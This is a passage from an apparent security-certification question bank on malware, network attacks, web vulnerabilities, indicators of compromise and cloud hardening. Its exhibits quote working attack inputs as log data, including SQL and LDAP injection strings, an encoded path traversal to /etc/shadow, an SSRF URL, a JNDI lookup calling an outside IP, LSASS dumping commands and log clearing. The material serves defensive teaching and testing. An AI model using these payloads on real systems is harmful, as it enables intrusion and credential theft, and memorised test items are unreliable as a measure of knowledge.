w: Info-stealers take session cookies, and replaying a valid cookie skips the login step, including MFA. A SIM swap affects SMS rather than an authenticator app, a cracked password would still face MFA, and nothing suggests MFA was turned off by location.
h: Steal the cookie, skip the door.

q: A developer installed the npm package 'reqeusts-promise', a misspelling of a popular library. It works as expected, but on install it also runs a script that posts the developer's cloud credentials to a remote server. Which BEST describes the package?
o: A Trojan delivered through a typosquatted package name
A worm spreading through the package registry
Bloatware bundled with the developer's operating system
A logic bomb waiting for a future release date
w: It looks useful and works while hiding a malicious payload (a Trojan), and it reached the developer through a lookalike name (typosquatting). It didn't self-propagate, wasn't preinstalled, and acted immediately on install.
h: A misspelled name hiding a real payload.

q: A macro was planted in a law firm's shared Word template. Each time an associate creates a document from the template and later emails it to a colleague who opens it, the macro copies itself into that colleague's own templates. It never scans or connects to other hosts. Which malware type BEST fits?
o: Virus
Worm
Ransomware
Rootkit
w: Code that attaches to host files and spreads only when users open infected files is a virus. A worm spreads across the network by itself, ransomware encrypts or extorts, and a rootkit hides its presence rather than spreading through documents.
h: Needs a host and a user to travel? Virus.

ack: Options quote the exhibit's own log lines.
q: An analyst is reviewing an EDR timeline from a domain controller. Which TWO lines MOST directly indicate credential dumping?
c:
L1  03:10  svchost.exe   > taskhostw.exe  (scheduled maintenance)
L2  03:12  cmd.exe       > procdump.exe -ma lsass.exe C:\Temp\l.dmp
L3  03:13  powershell.exe > Get-ADUser -Filter * | Export-Csv users.csv
L4  03:15  rundll32.exe  C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\m.bin full
L5  03:16  sc.exe        stop WinDefend
o: L2: procdump writing a memory dump of lsass.exe
L4: comsvcs.dll MiniDump of process ID 624
L3: exporting every AD user to a CSV file
L5: stopping the Windows Defender service
L1: scheduled maintenance via taskhostw.exe
w: LSASS holds credential material, so dumping its memory with procdump or comsvcs MiniDump (PID 624 here) is credential dumping. Exporting users is reconnaissance, stopping Defender is defense evasion, and the scheduled task is routine.
h: Anything dumping LSASS is going for the passwords.

q: The internal DNS resolver's logs for one workstation show the queries below, about 4,000 per hour, all to a domain registered last week. Web traffic from the host looks normal. What is the MOST likely activity, and the BEST control?
c:
TXT  a7f3k2m9q1x8c4v6b0n5.zx81.cdn-metrics.io
TXT  q8w2e4r6t1y3u5i7o9p0.zx82.cdn-metrics.io
TXT  m1n3b5v7c9x2z4l6k8j0.zx83.cdn-metrics.io
o: DNS tunneling; inspect lookups and filter new domains at the resolver
DNS cache poisoning; deploy DNSSEC validation on the internal recursive resolver
Domain hijacking; enable registrar lock for the company's own domain
An amplification attack; rate-limit responses from the resolver
w: Thousands of long, random subdomain lookups to one new domain is data or command traffic encoded in DNS. Poisoning would corrupt answers rather than generate odd queries, the company's own domain isn't involved, and amplification abuses resolvers to flood a third party.
h: Random subdomains by the thousand = data hiding in DNS.

q: Laptops on a branch's wired network began receiving a default gateway of 10.8.0.66, a desktop under a desk, instead of the router at 10.8.0.1. The desktop is running an unauthorized DHCP service. Which switch feature MOST directly prevents this?
o: DHCP snooping that trusts only the uplink port toward the real server
Port mirroring of all access ports to the security monitoring sensor
Spanning Tree root guard on every access-layer switch port
Jumbo frames enabled across the access and distribution switches
w: DHCP snooping drops server responses (offers) arriving on untrusted access ports, stopping rogue DHCP that sets up an on-path position. Mirroring only observes, root guard protects the spanning tree topology, and jumbo frames change packet sizes.
h: Only trusted ports get to hand out addresses.

q: At a conference, attendees on the venue Wi-Fi typed a bank's address without 'https://' and landed on a convincing HTTP version of the login page, while the real site serves only HTTPS. Which control on the bank's side would MOST directly prevent returning visitors from being downgraded this way?
o: HTTP Strict Transport Security, preloaded for the domain
A longer RSA key for the bank's public TLS certificate
Moving the bank's DNS records over to a different registrar
Rate limiting on the bank's login API endpoint
w: HSTS (especially preloaded) tells browsers to use only HTTPS for the domain, so an on-path attacker can't strip the connection to HTTP. Key length doesn't stop stripping, the registrar move is unrelated, and rate limiting doesn't stop interception.
h: HSTS: the browser refuses to knock on the HTTP door.

q: A small ISP's NetFlow data shows the pattern below hitting a customer's web server. Which attack is this, and where is it BEST mitigated?
c:
src: 4,812 distinct public IPs   sport: 123/udp   dst: 198.51.100.40   dport: random
request size seen at reflectors: ~234 bytes   response size: ~48,000 bytes
aggregate: 38 Gbps inbound to customer (link capacity 10 Gbps)
o: A reflected NTP amplification DDoS, mitigated upstream by a scrubbing service
A SYN flood against the web server, mitigated with SYN cookies on the host
An on-path attack on the web server, mitigated with mutual TLS everywhere
DNS tunneling from the web server, mitigated by blocking outbound DNS
w: Small spoofed requests to NTP servers (source port 123) that return huge responses to the victim are reflected amplification, and 38 Gbps against a 10 Gbps link must be filtered upstream before the link. SYN cookies are for TCP floods, and there's no interception or DNS involved.
h: If the flood is bigger than your pipe, stop it before your pipe.

q: A ticketing site slows to a crawl even though bandwidth sits at 4% and CPU is low. A few hundred clients each hold dozens of connections open, sending one header line every 20 seconds and never finishing a request. The web server's connection limit is exhausted. Which BEST describes this, and the BEST mitigation?
o: An application-layer DoS; enforce timeouts and limits at a reverse proxy
A volumetric DDoS; buy more upstream bandwidth from the ISP immediately today
A SYN flood; enable SYN cookies on the operating system's TCP stack
An on-path attack; move every page to HTTPS with HSTS preloading
w: Holding many slow, incomplete HTTP requests exhausts connection slots with very little traffic, which is an application-layer (slow-rate) DoS; a reverse proxy or WAF with strict timeouts absorbs it. Bandwidth isn't the bottleneck, the TCP handshakes complete so it isn't a SYN flood, and HTTPS doesn't address resource exhaustion.
h: Low bandwidth, full server? Someone is hogging the chairs.

q: Guests in a hotel lobby report a certificate warning when they open any HTTPS site, naming an issuer called 'Lobby-WiFi-Secure CA.' The hotel's real access points don't intercept TLS. Which attack is MOST likely in progress?
o: An on-path attack by a rogue AP intercepting TLS
A jamming attack disrupting the lobby's wireless channels
A DNS sinkhole set up by the hotel's security team
A replay attack against the hotel's captive portal
w: An unknown CA issuing certificates for every site means something in the path is intercepting and re-signing TLS, typically a rogue AP acting on-path. Jamming causes outages, not certificate warnings, a sinkhole redirects specific malicious domains, and replay reuses captured messages.
h: A strange CA on every site means someone's in the middle.

q: An API gateway's logs show the same signed request, a $50 store-credit transfer with an identical signature, accepted 30 times in two minutes from an IP that never authenticated. The signature is valid each time. What is the MOST effective fix?
o: Add a one-time nonce plus timestamp and reject reused values
Rotate the API signing key every 24 hours on a schedule
Require TLS 1.3 for every client connection to the gateway
Block the offending source IP address at the network perimeter
w: A valid signature reused many times is a replay attack; a nonce plus timestamp makes each request usable only once. Key rotation still allows replays within a day, TLS doesn't stop resending captured messages, and the attacker can change IP addresses.
h: A signature without a nonce can be cashed again and again.

q: An analyst runs the command below on a Windows workstation in VLAN 20, whose gateway is 10.20.0.1. Which conclusion is MOST supported?
c:
C:\> arp -a
Interface: 10.20.0.57
  Internet Address      Physical Address
  10.20.0.1             3c-52-82-1f-9a-04   dynamic
  10.20.0.14            3c-52-82-1f-9a-04   dynamic
  10.20.0.22            a4-bb-6d-10-77-3e   dynamic
  10.20.0.30            00-50-56-a1-2c-11   dynamic
o: Host 10.20.0.14 is poisoning ARP to impersonate the gateway
Host 10.20.0.22 is flooding the switch with forged MAC addresses
The gateway 10.20.0.1 has failed and been replaced by 10.20.0.30
VLAN 20 has a DHCP conflict between 10.20.0.14 and 10.20.0.22
w: The gateway's IP resolves to the same MAC as 10.20.0.14, so that host is answering for the gateway: ARP poisoning toward an on-path position. Nothing shows MAC flooding, gateway replacement, or a DHCP conflict.
h: Two IPs, one MAC, and one of them is the gateway? Someone's impersonating it.

q: A university's SOC knows several infected lab PCs are trying to reach command servers at domains that change daily. It wants to stop those connections and identify every infected host, without installing anything on the lab PCs. Which control BEST meets both goals?
o: A DNS sinkhole that answers malicious lookups with a logging address
A honeypot server placed in the lab VLAN to attract attackers
An IPS signature written for each command server IP address
Port security set to one MAC address per lab switch port
w: A sinkhole returns a controlled address for known-bad domains, so connections fail and every host that asks shows up in the logs, with no agent required. A honeypot attracts attackers rather than catching outbound lookups, IP signatures can't keep up with daily domain changes, and port security limits devices per port.
h: Let them ask for the bad address, then write down who asked.

q: A university's campus network suffered a rogue DHCP server last month and an ARP spoofing attack this week, both launched from student dorm ports. A network engineer wants features on the access switches that stop both problems. Which TWO features should be enabled together?
o: DHCP snooping
Dynamic ARP inspection
Port mirroring
Spanning Tree root guard
Jumbo frames
w: DHCP snooping blocks rogue DHCP offers and builds a binding table of IP-to-MAC leases, which dynamic ARP inspection uses to drop forged ARP replies. Mirroring only copies traffic, root guard protects STP, and jumbo frames change packet sizes.
h: Snooping writes the guest list; DAI checks it.

q: A WAF in monitor mode logs the requests below against a reporting portal. Responses to normal requests take about 120 ms. Which attack is being attempted, and what fixes it at the root?
c:
GET /report?id=771                                   200   118 ms
GET /report?id=771;WAITFOR DELAY '0:0:8'--           200  8,124 ms
GET /report?id=771 AND 1=(SELECT 1 FROM sys.tables)  200   131 ms
o: Blind SQL injection; use parameterized queries
Command injection; remove shell calls from the code
Reflected XSS; encode output before rendering it
Directory traversal; canonicalize the file paths used
w: An 8-second delay triggered by WAITFOR shows the injected SQL ran, even though no data came back: time-based blind SQL injection, fixed with parameterized queries. No shell, browser script, or file path is involved.
h: If a sleep command makes the page sleep, your SQL is running theirs.

q: A customer signed in to a utility's billing portal changes the URL from /invoice?id=50213 to /invoice?id=50214 and sees another customer's name, address, and usage. No error is logged. Which flaw does this BEST represent?
o: Missing authorization checks that allow horizontal privilege escalation
Directory traversal letting the user read arbitrary files on the server
Cross-site request forgery against the invoice viewing page
SQL injection through the invoice ID parameter in the URL
w: The server returns objects without checking that they belong to the requester, so a user reaches other users' data at the same privilege level. No file path, forged cross-site request, or injected SQL is involved, only a changed ID.
h: Changing a number shouldn't change whose data you see.

q: A retailer found reflected XSS in its search page. The developers have fixed output encoding there, but leadership wants a browser-enforced defense-in-depth control that would block injected inline scripts if a similar bug appears elsewhere. Which control BEST fits?
o: A Content Security Policy restricting script sources
Parameterized queries for every database call in the app
The Secure flag set on all of the session cookies
Rate limiting applied to the search endpoint
w: A CSP tells browsers to refuse inline and unapproved scripts, limiting damage from future XSS. Parameterized queries stop SQL injection, the Secure flag only keeps cookies off plain HTTP, and rate limiting doesn't stop script execution.
h: CSP is the browser's guest list for scripts.

q: An intranet login form checks credentials against a directory. A tester enters the username below with any password and is logged in as the first account in the directory. Which vulnerability is this, and what is the root-cause fix?
c:
username: *)(uid=*))(|(uid=*
password: anything
o: LDAP injection; escape special characters and use safe query APIs
SQL injection; use parameterized queries for the user table
Directory traversal; restrict file paths to the web root
Credential replay; add a nonce to every login request
w: The parentheses and wildcards rewrite the LDAP filter so it matches any user, which is LDAP injection; escaping filter metacharacters and using safe query builders fixes it. It isn't SQL, no file paths are used, and nothing was captured and replayed.
h: Parentheses and asterisks in a username? Someone's editing your LDAP filter.

q: An image server rejects requests containing '../'. A tester sends the request below and receives the server's /etc/shadow file. What does this show, and what is the BEST fix?
c: GET /img?file=..%252f..%252f..%252fetc%252fshadow
o: Double-encoded traversal; decode, canonicalize, then allow-list paths
SQL injection; switch the image lookup to parameterized database queries
SSRF; block requests to internal IP addresses at the outbound proxy
Command injection; remove every shell call from the image handler code
w: %252f decodes to %2f and then to '/', so a filter that only looks for '../' once is bypassed; the fix is to decode completely, resolve to a canonical path, and check it against an allowed directory. No database, outbound request, or shell is involved.
h: Filters that check before decoding get fooled by encoding.

q: A project management SaaS lets users add webhook URLs that its server calls when tasks change. A tester sets the webhook to the address below and the server's response includes data from an internal cache service. Which vulnerability and mitigation are BEST?
c: webhook_url = http://127.0.0.1:6379/
o: SSRF; allow-list destinations and block private ranges
CSRF; require anti-CSRF tokens on the webhook settings form
Directory traversal; restrict file paths to the uploads folder
Stored XSS; encode webhook URLs before displaying them
w: The server made a request to an attacker-chosen internal address (localhost:6379), which is server-side request forgery; restricting destinations fixes it. CSRF forges a victim's browser request, traversal reads files, and XSS runs script in browsers.
h: If your server will call any address, it will call yours for them.

q: A legacy network service written in C crashes when it receives long hostnames, and researchers show they can overwrite the return address on the stack. Rewriting the service is planned for next year. Which approach BEST eliminates this class of flaw in the replacement?
o: Rewrite it in a memory-safe language with bounds checking
Run the current service on a faster server with far more RAM
Add the service's port to the host-based firewall's allow list
Put the service behind TLS so inputs are encrypted in transit
w: Stack overwrites come from unchecked memory writes; memory-safe languages and bounds checking prevent buffer overflows by design. More hardware, firewall rules, or encryption don't change how the program handles oversized input.
h: Overflows need a language that lets you write past the end.

q: A profile update API accepts the JSON body below from a normal user. Afterward, the user has administrator rights in the app. What is the BEST fix?
c:
PATCH /api/v2/users/me
{ "displayName": "Sam", "timezone": "UTC-5", "role": "admin" }
o: Accept only an allow-list of user-editable fields on the server
Encrypt the JSON body so users can't read the field names in transit
Validate that displayName contains only letters and spaces
Rate-limit the profile endpoint to five requests per minute
w: The server blindly applied a privileged field the client supplied, a privilege escalation through mass assignment; only accepting expected, user-editable fields fixes it. Encryption doesn't stop the user crafting the body, validating displayName ignores the role field, and rate limiting allows one malicious request.
h: The server decides your role, never the request.

q: An application's access logs contain the user-agent string below, and minutes later the server makes an outbound LDAP connection to an unknown host. Which BEST describes the attack and the FIRST priority?
c: User-Agent: ${jndi:ldap://203.0.113.77:1389/a}
o: Injected input executed by the logger; patch it and restrict egress
Cross-site scripting through the user-agent; encode the header in log viewers
Directory traversal through the logs folder; restrict log file paths
Credential stuffing against the LDAP server; enforce account lockout
w: A JNDI lookup string in a logged header that triggers an outbound LDAP call shows injected input being executed by a vulnerable logging component; patching and restricting outbound connections come first. It isn't browser script, file path abuse, or password guessing.
h: If logging a string makes the server phone out, the logger is executing input.

q: A healthcare portal's penetration test found a stored XSS flaw in the patient comments feature, and leadership wants layered fixes before the next audit. Which TWO controls MOST directly prevent or limit stored XSS?
o: Context-aware output encoding of user content
A Content Security Policy restricting script sources
Parameterized queries for comment storage
Account lockout after five failed logins
TLS 1.3 for every portal connection
w: Encoding output for its context stops the browser treating stored content as script, and a CSP blocks scripts that slip through. Parameterized queries stop SQL injection, lockout stops password guessing, and TLS protects data in transit.
h: Encode what you show; restrict what can run.

q: A banking app's password reset sends a 4-digit code by SMS. A tester scripts guesses against the verification endpoint and gets in after about 6,000 attempts in under ten minutes, with no lockout or delay. What is the MOST direct fix?
o: Limit and lock out repeated tries, and expire codes quickly
Send the reset code by email instead of by SMS text message
Encrypt the code in transit with TLS 1.3 end to end
Require the user's current password before sending the reset code
w: A 10,000-value code falls quickly to unlimited guessing, so attempt limits and short expiry are the fix. Changing the delivery channel or encrypting it doesn't stop guessing, and requiring the password defeats the purpose of a reset.
h: Small codes need strict limits on guesses.

q: An analyst reviews the output below from a public-facing build server overnight. No builds were scheduled. Which indicator and cause are MOST likely?
c:
top - 03:41:07  load average: 15.92, 15.88, 15.71  (16 cores)
  PID USER     %CPU COMMAND
 9182 jenkins  1580 ./kdevtmpfsi --url pool.supportxmr.com:443
 9201 jenkins     3 sshd: jenkins@notty
o: Resource consumption from an unauthorized cryptominer
Resource inaccessibility from a ransomware encryption run
Out-of-cycle logging from a misconfigured backup job
Concurrent session usage by two legitimate build engineers
w: Near-total CPU use by an unknown process talking to a Monero mining pool is resource consumption from cryptojacking, likely through the exposed build service. Nothing is encrypted or inaccessible, it isn't a logging timing issue, and the process isn't a person's session.
h: All the cores busy for someone else's coins.

q: Between 02:00 and 02:20, 180 different user accounts were locked out at a law firm. Every lockout followed exactly three failures from the same external IP address, and no account saw more than three attempts. What is the MOST likely activity?
o: Password spraying that tripped a low failure threshold
Brute force against a single privileged account
A misconfigured service using an expired password
Impossible travel caused by a VPN egress change
w: A few attempts against many accounts from one source is password spraying; here the attacker's guess count met the three-failure threshold. Brute force targets one account with many guesses, a service account issue would hit one account repeatedly, and impossible travel involves successful logins far apart.
h: A little against many = spraying.

q: The SIEM stopped receiving Security events from a finance server at 01:14. EDR shows that at 01:13 a domain admin account ran 'wevtutil cl Security' and then stopped the log forwarding service. Which indicator is MOST evident?
o: Missing logs caused by deliberate defense evasion
Resource inaccessibility from a disk that filled up
Published/documented data appearing on a leak site
Blocked content from the web proxy's malware category
w: Clearing the Security log and stopping forwarding creates a deliberate gap, which is the missing logs indicator. A full disk would show other errors, nothing has been published, and the proxy isn't involved.
h: Logs don't fall silent on their own at 01:14.

q: Staff at a dental practice can no longer open files on the shared drive. Every document shows an error saying the file is damaged, and each folder now holds a text file with payment instructions. Which indicator is the users' symptom MOST directly describing?
o: Resource inaccessibility
Concurrent session usage
Out-of-cycle logging
Impossible travel
w: Users suddenly unable to reach or open data is resource inaccessibility, here caused by ransomware encryption. The other indicators concern overlapping logins, logging at unexpected times, and logins from places too far apart.
h: Can't open what you could yesterday? Inaccessibility.

q: A manufacturer's SOC receives an alert from a threat intelligence service: a set of its engineering drawings, with file names matching an internal project, is being offered for sale on a criminal forum. No internal alert has fired. Which indicator does this represent?
o: Published/documented
Blocked content
Resource consumption
Account lockout
w: The company's data appearing publicly or for sale is the published/documented indicator, often the first sign of a breach that internal controls missed. Blocked content, resource consumption, and lockouts are observed inside the environment.
h: Sometimes you learn of the breach from the seller.

q: The service account svc_scan has locked out every 15 minutes since Monday. Every failure comes from LEGACY-APP-03, a server that was supposed to be decommissioned last month, and the failure reason is always 'bad password.' The account's password was changed on Monday. What is the MOST likely cause?
o: A scheduled task on the old host still uses the previous password
An attacker inside the network brute-forcing the svc_scan password
Password spraying across many service accounts at once
A replay of captured Kerberos tickets for svc_scan
w: Failures at a fixed interval from one known server, starting right after a password change, point to a stale credential in a scheduled job, not an attack (though the server should still be shut down). A brute force would vary its timing and passwords, spraying hits many accounts, and replay wouldn't cause bad-password failures.
h: Clockwork failures after a password change = a forgotten job.

q: An impossible travel alert fires: a user signed in from London and, five minutes later, from Frankfurt. The user is in London. The Frankfurt address belongs to the company's own cloud VPN gateway, which the user's laptop connects through automatically. What should the analyst do NEXT?
o: Verify the Frankfurt IP is company VPN egress, then tune the rule
Disable the user's account and force a password reset immediately
Escalate to the incident response team as a confirmed compromise
Block Frankfurt as a sign-in location for every user
w: The evidence points to a false positive caused by the company's own VPN egress; confirming it and tuning the detection keeps the rule useful. Disabling the account or declaring an incident overreacts, and blocking Frankfurt would cut off every VPN user.
h: Check whose IP it is before chasing the plane ticket.

q: A workstation that normally sends about 200 MB a day uploaded 41 GB to a personal cloud storage service between 01:00 and 04:00. The user is on vacation, and their account shows no interactive logon. Which TWO indicators does this evidence MOST directly show?
o: Resource consumption (unusual outbound bandwidth)
Out-of-cycle activity (overnight, while the user is away)
Impossible travel between two sign-in locations
Account lockout after repeated failed logins
Published/documented data on a public leak site
w: An extreme jump in outbound data is resource consumption, and the timing, overnight while the user is on vacation, makes it out-of-cycle. No sign-ins from distant places, lockouts, or public postings are described.
h: Too much, at the wrong time.

q: EDR on a reception PC records the events below within two minutes. Which conclusion is MOST supported?
c:
09:31:02  reg set  HKLM\SOFTWARE\Policies\Microsoft\Windows Defender  DisableAntiSpyware=1
09:31:05  schtasks /create /tn "OneDriveSync" /tr C:\Users\Public\od.exe /sc onlogon
09:31:40  od.exe  (unsigned)  -> 45.95.11.8:443  every 60s
o: Malware is disabling defenses, persisting, and beaconing out
An administrator is configuring OneDrive sync for the reception PC
Windows Update is replacing Defender with a newer engine
A user is uploading files to their personal OneDrive account
w: Turning off Defender by policy, a logon task named to look like OneDrive pointing at an unsigned binary in a public folder, and regular outbound beacons are classic malware indicators. Real OneDrive doesn't run from C:\Users\Public or disable Defender, and updates don't create these artifacts.
h: Defense off, persistence on, phone home: that's malware's routine.

q: An identity platform shows one employee's account with active web sessions from a corporate laptop in Denver and from an unmanaged Android device in Denver at the same time. The employee says they only use their laptop. Which indicator is this?
o: Concurrent session usage
Impossible travel
Out-of-cycle logging
Resource inaccessibility
w: Two simultaneous sessions for one account when the user only uses one device is concurrent session usage, even in the same city. Impossible travel needs locations too far apart for the time elapsed, and the others describe logging timing or access failures.
h: Same time, two devices, one person? Someone else is in.

q: A hospital's IT team notices that its nightly backup and log rotation jobs, which always run at 02:00, ran at 14:30 today. No change ticket exists, and the job's command line now includes an extra step that copies the backup to an external IP address. Which indicator is MOST directly observed first?
o: Out-of-cycle activity in scheduled jobs and logging
Resource inaccessibility for clinical systems
Impossible travel for the backup service account
Published/documented data on a leak site
w: A routine job running at an unexpected time without a change ticket is out-of-cycle activity, the first clue here; the added copy step then suggests exfiltration. Nothing is inaccessible, no remote logins are involved, and nothing has been published.
h: Right job, wrong time, no ticket: look closer.

q: After a phishing incident, an analyst checks the mailbox rules on a finance employee's account and finds the rule below, created at 23:48 from an IP in a country where the company has no staff. What does the rule MOST likely indicate?
c:
Rule: "."  Conditions: subject or body contains "invoice","payment","wire"
Actions: move to RSS Subscriptions; mark as read; forward to accts.recon@freemail-example.net
o: An intruder is hiding and copying wire emails sent to this user
The employee created a filter to tidy up routine vendor newsletters and alerts
The mail server applied a default anti-spam rule to this inbox
Outlook created the rule automatically after a recent profile repair
w: A rule with a meaningless name that hides payment-related mail and forwards it externally, created from an unexpected country, is a hallmark of mailbox takeover used for BEC. Users don't forward wire emails to free webmail, and servers and Outlook don't create rules like this on their own.
h: Hidden, forwarded, and about money: someone's watching that inbox.

q: A marketing agency discovers that staff use 70 different SaaS apps, only 9 of them approved. Leadership wants to see which unsanctioned apps are in use, and to block uploads of client files to personal storage while still allowing the approved tools. Most staff work remotely. Which solution BEST meets both needs?
o: A CASB with API integration and inline policy enforcement
A SIEM that ingests firewall logs from the headquarters office
Network access control that checks device posture at every office port
A forward proxy deployed only at the headquarters internet edge
w: A cloud access security broker discovers shadow SaaS use and enforces data policies inside sanctioned apps, including for remote users. A SIEM or an HQ-only proxy misses remote traffic and can't act inside SaaS apps, and NAC controls network admission, not cloud app use.
h: CASB stands between your people and their cloud apps.

ack: Options name the exhibit's own security groups and bastion.
q: A cloud posture scan of a startup's production VPC returns the security group rules below. The database is reached only by the app tier, and admins connect through a bastion at 10.0.0.10. Which change is MOST urgent?
c:
sg-prod-db   inbound  tcp/5432  0.0.0.0/0
sg-prod-db   inbound  tcp/22    0.0.0.0/0
sg-prod-app  inbound  tcp/443   0.0.0.0/0
sg-prod-app  inbound  tcp/22    10.0.0.10/32
o: Limit sg-prod-db to 5432 from sg-prod-app and SSH from the bastion only
Remove the HTTPS rule from sg-prod-app because 443 is open to the world
Restrict the app tier's SSH rule to the full 10.0.0.0/16 VPC range
Add an outbound deny-all rule to sg-prod-app to block data exfiltration
w: The database accepts PostgreSQL and SSH connections from the entire internet, the clearest exposure; it should accept only the app tier's security group and the bastion. Public HTTPS to the app tier is intended, widening SSH to the whole VPC loosens a correct rule, and an outbound deny on the app tier doesn't close the open database.
h: Fix what the whole internet can already reach.

q: A credit union's lab runs VMs on administrators' laptops using a desktop hypervisor installed on Windows. The new production virtualization cluster must have the smallest attack surface possible and no general-purpose OS underneath the hypervisor. Which choice BEST meets this?
o: A Type 1 bare-metal hypervisor
A Type 2 hosted hypervisor
Containers on a hardened Linux host
Application virtualization on the desktops
w: A Type 1 hypervisor runs directly on the hardware without a host OS, which shrinks the attack surface. A Type 2 hypervisor sits on a general-purpose OS like the lab setup, containers share a host kernel, and application virtualization doesn't host full servers.
h: Type 1 = first thing on the metal.

q: An audit of a university's private cloud finds 340 VMs with no owner tag. Many were created for projects that ended years ago, and most haven't been patched in over a year. Which problem does this describe, and what BEST addresses it?
o: VM sprawl; require tags naming an accountable contact plus expiry dates, and retire untagged VMs
VM escape; isolate each VM on its own physical host and disable shared memory features
Resource reuse; wipe virtual disks whenever a VM is reallocated to a different tenant
Hypervisor drift; reinstall the hypervisor and restore every VM from its latest backup
w: Uncontrolled growth of forgotten, unmanaged VMs is VM sprawl, solved with lifecycle controls such as ownership, expiry, and scheduled cleanup. VM escape is guest-to-host breakout, resource reuse is data left in reallocated storage, and reinstalling the hypervisor doesn't remove orphaned VMs.
h: If no one owns it, no one patches it.

q: A developer asks the platform team to approve the deployment flags below for a log-collection container so it can 'read host logs.' What is the PRIMARY risk, and the BEST response?
c: docker run --privileged -v /:/host --pid=host logagent:2.3
o: Container escape to the host; drop the elevated flag and mount only the log path read-only
Image bloat from the root mount; rebuild the container on a slimmer Alpine Linux base image
A noisy-neighbor CPU issue; set cgroup CPU limits on the log container
Unencrypted logs in transit; add TLS to the log shipping connection
